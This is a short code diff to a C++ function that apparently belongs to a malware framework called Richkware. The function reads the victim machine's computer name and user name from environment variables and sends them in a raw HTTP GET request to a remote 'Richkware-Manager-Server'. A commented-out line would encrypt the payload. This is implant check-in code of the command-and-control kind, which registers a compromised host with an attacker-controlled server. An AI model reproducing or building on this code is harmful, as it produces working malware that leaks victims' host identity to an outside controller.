@@ -133,26 +133,21 @@ const char* Network::RawRequest(const char* serverAddress, const char* port,	con
 
 
 bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, const char* port) {
-    TCHAR  infoBuf[8000];
-    DWORD  bufCharCount = 8000;
-    std::string computerName;
-    if (!GetComputerName(infoBuf, &bufCharCount))
-        computerName = infoBuf;
-    std::string userName;
-    if (!GetUserName(infoBuf, &bufCharCount))
-        userName = infoBuf;
-
     const char* serverPort = server.getPort();
 
-    Device device = Device(computerName + "/" + userName, serverPort);
+    std::string name = getenv("COMPUTERNAME");
+    name.append("/");
+    name.append(getenv("USERNAME"));
+
+    Device device = Device(name, serverPort);
 
     std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
     //deviceStr = EncryptDecrypt(deviceStr,"5");
 
     RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" +deviceStr +" HTTP/1.1\r\n"
             "Host: " + serverAddress + "\r\n"+
-            "Connection: close\r\n"+
-            "\r\n").c_str());
+                                     "Connection: close\r\n"+
+                                     "\r\n").c_str());
 
     return true;
 }
